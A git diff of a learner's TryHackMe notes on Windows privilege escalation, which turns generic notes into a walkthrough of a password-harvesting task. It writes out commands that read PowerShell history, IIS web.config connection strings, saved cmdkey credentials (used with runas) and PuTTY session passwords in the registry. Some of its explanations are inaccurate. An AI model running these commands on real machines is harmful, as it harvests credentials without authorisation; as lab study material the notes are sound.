@@ -1,69 +1,94 @@
-# Windows Privilege Escalation Notes[Draft]
+# Windows Privilege Escalation Notes.
 
 > These are my personal cybersecurity learning notes written in my own words.
 > I do not publish flags, direct answers, private-room solutions, or copied premium content.
 
 ## Platform
+
 TryHackMe
 
 ## Topic
+
 Windows Privilege Escalation
 
-## Goal
-Understand how privilege escalation works on Windows systems by learning enumeration, permissions, misconfigurations, services, users, groups, and privilege abuse.
+# Step 1:
 
-## What I learned today
-- Windows privilege escalation starts with proper enumeration.
-- I should understand my current user before trying to escalate.
-- Services, permissions, users, groups, scheduled tasks, and stored credentials are important areas to check.
-- Manual enumeration helps me understand what tools are doing behind the scenes.
+First, connect to the box using the given box IP.
 
-## Basic enumeration commands
-
-```cmd
-whoami
-whoami /priv
-whoami /groups
-hostname
-systeminfo
-ver
-ipconfig /all
-net user
-net localgroup
-net localgroup administrators
-netstat -ano
-sc query
+```bash
+xfreerdp /v:xx:xx:xx:xx(your_Box_IP) /u:name /p:password/
 ```
 
-## Important areas to check
-# User context
+# Step 2:
 
-Before privilege escalation, I need to know which user I am and what privileges/groups I have.
+## Task 3: Harvesting Passwords from Usual Spots
 
-## System information
+### 1. A password for the julia.jones user has been left on the Powershell history. What is the password?
 
-OS version, architecture, patches, and hostname can help identify possible attack paths.
+## Lesson:
 
-## Services
+The question mentioned that the password has been left in the Powershell history, so we can dump the Powershell history by using the following command:
 
-Misconfigured services can sometimes allow privilege escalation.
+```powershell
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
 
-# File permissions
+## Mistake I made:
 
-Weak permissions on important files or folders may allow modification or abuse.
+I first tried to dump the history in `cmd.exe` using:
 
-# Stored credentials
+```cmd
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
 
-Credentials may be stored in files, registry, config files, history, or scripts.
+There is a slight change in the command. `$Env:userprofile` replaces `%userprofile%` in the header.
 
-# My mistakes
-I should not jump directly to tools.
-I should understand each command before using it.
-I should take clean notes while solving the room.
-I should separate public notes from private room answers.
-# summary
+### 2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
 
-Windows privilege escalation is mainly about enumeration and finding weak points in permissions, services, credentials, and user privileges. The goal is to move from a low-privileged user to a higher-privileged user by understanding how the system is configured.
+## Lesson:
+
+A quick way to find database connection strings on the system:
+
+```powershell
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+Just put the command in Powershell, and you will find the password.
+
+### 3. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
+
+## Lesson:
+
+To spawn a shell for any user, we first list the admins using:
+
+```cmd
+cmdkey /list
+```
+
+Then we use:
+
+```cmd
+runas /savecred /user:adminname(required admin name) cmd.exe
+```
+
+That redirects to the admin’s machine. Then we can find the data, like the flag for this question.
+
+So, I added two screenshots.
+
+### 4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
+
+## Lesson:
+
+The question mentioned saved PuTTY sessions, so we will use the command:
+
+```cmd
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+And we will get the password.
+
+## End of Task 3
 
 # Tags
+
 #windows #privilege-escalation #tryhackme #crta-prep #redteam
